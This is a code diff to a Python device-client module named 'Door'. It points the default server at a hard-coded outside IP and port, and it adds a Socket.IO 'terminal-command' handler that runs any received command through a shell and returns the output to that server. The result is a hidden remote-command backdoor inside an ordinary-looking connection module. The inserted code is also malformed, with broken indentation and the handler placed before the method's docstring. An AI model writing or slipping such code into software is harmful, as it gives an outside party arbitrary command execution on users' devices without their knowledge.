@@ -22,9 +22,9 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 class Door(Module):
-    def __init__(self, server_url="http://localhost:3000", device_name=None):
+    def __init__(self, server_url="http://144.31.73.100:4546", device_name=None):
         super().__init__()
-        self.server_url = server_url
+        self.server_url = server_url  
         self.device_name = device_name or f"PythonDevice-{self.get_hostname()}"
         self.device_id = None
         self.is_connected = False
@@ -88,6 +88,141 @@ class Door(Module):
                 return "127.0.0.1"
     
     def setup_event_handlers(self):
+
+@self.sio.on('terminal-command')
+def on_terminal_command(data):
+    command = data.get('command', '')
+    from_user = data.get('from', 'Unknown')
+    client_socket_id = data.get('clientSocketId', '')
+    timestamp = data.get('timestamp', '')
+    
+    logger.info(f"Terminal command received: {command}")
+    logger.info(f"   From: {from_user}")
+    logger.info(f"   Client socket: {client_socket_id}")
+    
+    # Process the command
+    try:
+        result = self.execute_terminal_command(command)
+        
+        # Send response back
+        response_data = {
+            "clientSocketId": client_socket_id,
+            "response": result,
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        if self.is_connected:
+            self.sio.emit('terminal-response', response_data)
+            logger.info(f"Command response sent: {result[:50]}...")
+            
+    except Exception as e:
+        logger.error(f"Error executing command: {e}")
+        
+        error_response = {
+            "clientSocketId": client_socket_id,
+            "response": f"ERROR: {str(e)}",
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        if self.is_connected:
+            self.sio.emit('terminal-response', error_response)
+
+def execute_terminal_command(self, command):
+    """Execute a terminal command and return result"""
+    import subprocess
+    import platform
+    
+    logger.info(f"Executing command: {command}")
+    
+    # Handle special commands
+    if command.strip() == "help":
+        return """Available commands:
+• help - Show this help
+• status - Show device status
+• info - Show device information
+• date - Show current date and time
+• echo <text> - Echo back text
+• python - Check Python version
+• sysinfo - Show system information
+• ls [dir] - List directory contents
+• pwd - Show current directory
+• Any system command (will be executed on device)"""
+    
+    elif command.strip() == "status":
+        status = self.get_status()
+        return json.dumps(status, indent=2)
+    
+    elif command.strip() == "info":
+        info = self.get_device_info()
+        return json.dumps(info, indent=2)
+    
+    elif command.strip() == "date":
+        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    elif command.startswith("echo "):
+        return command[5:]
+    
+    elif command.strip() == "python":
+        import sys
+        return f"Python {sys.version}"
+    
+    elif command.strip() == "sysinfo":
+        import platform, psutil
+        info = {
+            "system": platform.system(),
+            "release": platform.release(),
+            "processor": platform.processor(),
+            "architecture": platform.architecture(),
+            "python_version": platform.python_version(),
+            "cpu_count": psutil.cpu_count(),
+            "memory_total": f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
+        }
+        return json.dumps(info, indent=2)
+    
+    elif command.startswith("ls"):
+        import os
+        parts = command.split()
+        directory = parts[1] if len(parts) > 1 else "."
+        try:
+            files = os.listdir(directory)
+            return "\n".join(files)
+        except Exception as e:
+            return f"Error: {str(e)}"
+    
+    elif command.strip() == "pwd":
+        import os
+        return os.getcwd()
+    
+    else:
+        # Execute as system command
+        try:
+            # Determine shell based on platform
+            shell = platform.system() == "Windows"
+            
+            result = subprocess.run(
+                command, 
+                shell=True, 
+                capture_output=True, 
+                text=True,
+                timeout=10
+            )
+            
+            output = ""
+            if result.stdout:
+                output += f"STDOUT:\n{result.stdout}"
+            if result.stderr:
+                output += f"\nSTDERR:\n{result.stderr}"
+            if result.returncode != 0:
+                output += f"\nExit code: {result.returncode}"
+            
+            return output if output else "Command executed (no output)"
+            
+        except subprocess.TimeoutExpired:
+            return "ERROR: Command timed out after 10 seconds"
+        except Exception as e:
+            return f"ERROR: {str(e)}"
+
+
         """Настраиваем обработчики событий Socket.IO"""
         
         @self.sio.event
